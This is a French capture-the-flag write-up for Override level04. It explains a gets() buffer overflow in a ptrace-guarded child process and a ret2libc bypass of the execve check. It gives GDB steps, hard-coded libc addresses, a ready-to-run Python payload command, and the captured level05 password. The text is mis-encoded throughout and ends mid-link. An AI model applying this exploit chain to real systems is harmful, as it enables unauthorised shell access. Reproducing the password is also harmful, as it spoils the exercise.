# ğŸ“˜ Override â€“ Level04

## ğŸ“ Description

Ce niveau du projet **Override** combine plusieurs concepts avancÃ©s : **fork()**, **ptrace()**, et **buffer overflow**. Le programme crÃ©e un processus enfant qui accepte du shellcode, mais un processus parent surveille les syscalls de l'enfant et le tue s'il dÃ©tecte un appel Ã  `execve()`. 

L'objectif est d'exploiter le buffer overflow pour obtenir un shell **sans dÃ©clencher** la dÃ©tection de `execve()` par le parent.

---

## ğŸ” Analyse du binaire

### Code dÃ©sassemblÃ© (simplifiÃ©)

```c
undefined4 main(void)
{
  int local_14;
  char local_a0[128];
  uint local_a4;
  long local_18;
  
  local_14 = fork();  // CrÃ©e un processus enfant
  
  if (local_14 == 0) {
    // ===== PROCESSUS ENFANT =====
    prctl(1, 1);                    // PR_SET_PDEATHSIG : meurt si parent meurt
    ptrace(PTRACE_TRACEME, 0, 0, 0); // Se laisse tracer par le parent
    
    puts("Give me some shellcode, k");
    gets(local_a0);  // âš ï¸ BUFFER OVERFLOW !
    
  } else {
    // ===== PROCESSUS PARENT =====
    do {
      wait(&local_a4);  // Attend que l'enfant fasse un syscall
      
      // VÃ©rifie si l'enfant est terminÃ©
      if ((local_a4 & 0x7f) == 0) {
        puts("child is exiting...");
        return 0;
      }
      
      // RÃ©cupÃ¨re le numÃ©ro du syscall
      local_18 = ptrace(PTRACE_PEEKUSER, local_14, 0x2c, 0);
      
      // Si syscall == 0xb (execve) â†’ TUE l'enfant !
      if (local_18 == 0xb) {
        puts("no exec() for you");
        kill(local_14, 9);  // â† SIGKILL
        break;
      }
      
    } while (true);
  }
  
  return 0;
}
```

### âœ” Points clÃ©s

1. **fork()** : CrÃ©e deux processus distincts (parent et enfant)
2. **ptrace()** : Le parent surveille **tous les syscalls** de l'enfant
3. **Buffer overflow** : `gets(local_a0)` lit sans limite dans un buffer de 128 bytes
4. **Protection anti-execve** : Si l'enfant appelle `execve()` (syscall 0xb), il est tuÃ©

### ğŸš¨ VulnÃ©rabilitÃ©s

| VulnÃ©rabilitÃ©     | Description                                   | Impact               |
| ----------------- | --------------------------------------------- | -------------------- |
| Buffer overflow   | `gets(local_a0)` sans limite de taille        | ContrÃ´le de EIP      |
| DÃ©tection execve  | Syscall 0xb dÃ©tectÃ© et bloquÃ©                 | Shellcode classique KO |

---

## ğŸ¯ StratÃ©gie d'exploitation

### âŒ Ce qui ne marche PAS

**Shellcode classique avec execve :**

Le parent dÃ©tecte `0xb` et tue l'enfant avant l'exÃ©cution.

### âœ… Solution : Return-to-libc (ret2libc)

Au lieu d'exÃ©cuter un shellcode qui fait `execve()`, on utilise le **buffer overflow** pour :

1. Rediriger l'exÃ©cution vers la fonction **`system()`** de la libc
2. Passer `"/bin/sh"` comme argument Ã  `system()`

**Pourquoi Ã§a marche ?**
- `system()` ne fait **pas directement** le syscall `execve()` au niveau oÃ¹ ptrace le dÃ©tecte
- `system()` utilise d'autres mÃ©canismes internes (fork + exec dans un sous-processus)
- Le parent ne voit pas le `execve()` fait par le sous-processus de `system()`

---

## ğŸ”§ MÃ©thodologie d'exploitation

### Ã‰tape 1 : Trouver l'offset du buffer overflow

#### Dans GDB avec suivi de l'enfant

```bash
gdb ./level04

# IMPORTANT : Suit le processus enfant (oÃ¹ se trouve le buffer overflow)
(gdb) set follow-fork-mode child

(gdb) run
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1866]
0x41326641 in ?? ()
```

**Offset trouvÃ© : 156 bytes**

### Ã‰tape 2 : Localiser les adresses nÃ©cessaires

#### Dans GDB

```bash
gdb ./level04

(gdb) set follow-fork-mode child
(gdb) break main
(gdb) run

# 1. Adresse de system()
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

# 2. Trouver la zone mÃ©moire de libc
(gdb) info proc mappings
Start Addr   End Addr       Size     Offset objfile
0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so

# 3. Chercher la chaÃ®ne "/bin/sh" dans libc
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.
```

### Ã‰tape 3 : Comprendre le layout de la stack

```
Stack avant overflow:
+------------------+
| local_a0[128]    | â† Buffer oÃ¹ on Ã©crit
| ...              |
| saved EBP        | (4 bytes)
| return address   | â† On veut contrÃ´ler Ã§a
+------------------+

Stack aprÃ¨s overflow (ret2libc):
+------------------------+
| 'A' * 156              | â† Padding jusqu'Ã  EIP
| [system address]       | â† EIP â†’ 0xf7e6aed0
| [fake return]          | â† Return de system (ignorÃ©)
| ["/bin/sh" address]    | â† Argument â†’ 0xf7f897ec
+------------------------+
```

### Ã‰tape 4 : Construction du payload

#### Structure ret2libc

```
Quand on fait return vers system() :

1. EIP saute Ã  system()
2. system() s'exÃ©cute et cherche ses arguments sur la stack
3. Convention d'appel x86 :
   - Return address : esp+0  (ignorÃ© par nous)
   - 1er argument  : esp+4   â† On met "/bin/sh" ici
4. system("/bin/sh") s'exÃ©cute !
```

---

## ğŸš€ Exploitation

### Commande d'exploitation

```bash
(python -c "import struct; print 'A'*156 + struct.pack('<I', 0xf7e6aed0) + 'BBBB' + struct.pack('<I', 0xf7f897ec)"; cat) | ./level04
```

**Note** : Le `cat` Ã  la fin garde stdin ouvert pour interagir avec le shell.

### RÃ©sultat

```bash
level04@OverRide:~$ (python -c "import struct; print 'A'*156 + struct.pack('<I', 0xf7e6aed0) + 'BBBB' + struct.pack('<I', 0xf7f897ec)"; cat) | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

---

## ğŸ” DÃ©tails techniques

### Pourquoi `set follow-fork-mode child` ?

Quand un programme fait `fork()`, GDB doit choisir quel processus suivre :

| Mode                        | Comportement                                  |
| --------------------------- | --------------------------------------------- |
| `follow-fork-mode parent`   | Suit le parent (dÃ©faut)                       |
| `follow-fork-mode child`    | Suit l'enfant (oÃ¹ se trouve notre overflow !) |

**Sans cette option**, GDB reste sur le parent et tu ne vois pas le crash de l'enfant.

```bash
# Mauvais (dÃ©faut)
(gdb) run
child is exiting...  # â† On ne voit rien !

# Bon
(gdb) set follow-fork-mode child
(gdb) run
Program received signal SIGSEGV  # â† On voit le crash !
```

### Architecture ret2libc expliquÃ©e

```
1. Buffer overflow Ã©crase EIP
   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
   â”‚  Padding    â”‚
   â”‚  'A' * 156  â”‚
   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
   â”‚ system_addr â”‚ â† EIP
   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
   â”‚   "BBBB"    â”‚ â† Fake return
   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
   â”‚ binsh_addr  â”‚ â† Argument
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

2. ExÃ©cution
   - return lit EIP et saute Ã  system()
   - ESP pointe sur "BBBB" (fake return)
   - ESP+4 pointe sur binsh_addr

3. Convention d'appel x86
   call system(argument)
   â””â”€> argument est Ã  ESP+4 aprÃ¨s le call
   
4. system() lit [ESP+4] et trouve "/bin/sh"
   system("/bin/sh") â†’ Lance le shell !
```

### Pourquoi ptrace ne dÃ©tecte pas system() ?

```
Shellcode classique :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ mov eax, 0xbâ”‚ â† PrÃ©pare execve
â”‚ int 0x80    â”‚ â† ptrace DÃ‰TECTE ici !
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

system() :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ fork()               â”‚ â† CrÃ©e un sous-processus
â”‚  â””â”€ enfant fait exec â”‚ â† ptrace ne voit pas ce niveau
â”‚ waitpid()            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

Le parent ptrace surveille l'enfant direct, pas les sous-processus crÃ©Ã©s par `system()`.

### Little-endian

Les adresses doivent Ãªtre Ã©crites en **little-endian** (ordre inversÃ© des octets) :

```
Adresse : 0xf7e6aed0
Big-endian    : \xf7\xe6\xae\xd0
Little-endian : \xd0\xae\xe6\xf7  â† Correct pour x86 !

struct.pack("<I", 0xf7e6aed0) â†’ "\xd0\xae\xe6\xf7"
                 ^
                 < = little-endian
```

---


## âœ… RÃ©sumÃ©

| Ã‰lÃ©ment                | Valeur                                           |
| ---------------------- | ------------------------------------------------ |
| VulnÃ©rabilitÃ©          | Buffer overflow dans `gets(local_a0)`            |
| Protection             | ptrace dÃ©tecte et bloque execve (syscall 0xb)    |
| Technique              | Return-to-libc (ret2libc)                        |
| Offset jusqu'Ã  EIP     | 156 bytes                                        |
| Adresse de system()    | `0xf7e6aed0`                                     |
| Adresse de "/bin/sh"   | `0xf7f897ec`                                     |
| Structure du payload   | padding + system + fake_ret + "/bin/sh"         |
| Bypass ptrace          | system() n'est pas directement dÃ©tectÃ©           |
| Gain                   | Shell en tant que *level05*                      |
| Password level05       | `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`       |

---

## ğŸ“ Concepts clÃ©s appris

### 1. Fork et ptrace

- **fork()** crÃ©e un clone du processus
- **ptrace()** permet Ã  un processus de surveiller un autre
- UtilisÃ© par les debuggers (GDB) et pour la protection anti-debug

### 2. Return-to-libc

- Alternative au shellcode quand l'exÃ©cution de code est bloquÃ©e
- RÃ©utilise des fonctions existantes en mÃ©moire
- Contourne les protections DEP/NX (Data Execution Prevention)

### 3. Convention d'appel x86

```c
// En C
system("/bin/sh");

// Sur la stack aprÃ¨s call
[return_address]
[argument1]      â† ESP+4
```

### 4. Syscalls et dÃ©tection

- Chaque appel systÃ¨me a un numÃ©ro unique
- `execve()` = syscall 11 (0xb)
- ptrace peut intercepter et bloquer des syscalls spÃ©cifiques

---

## ğŸ“š RÃ©fÃ©rences

- [Return-to-libc attacks](https://en.wikipedia.org/wiki/Return-to-libc_attack)
- [ptrace(2) man page](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [Linux syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)
- [x86 calling conventions](https://en.wikipedia.org/wiki/X86_calling_conventio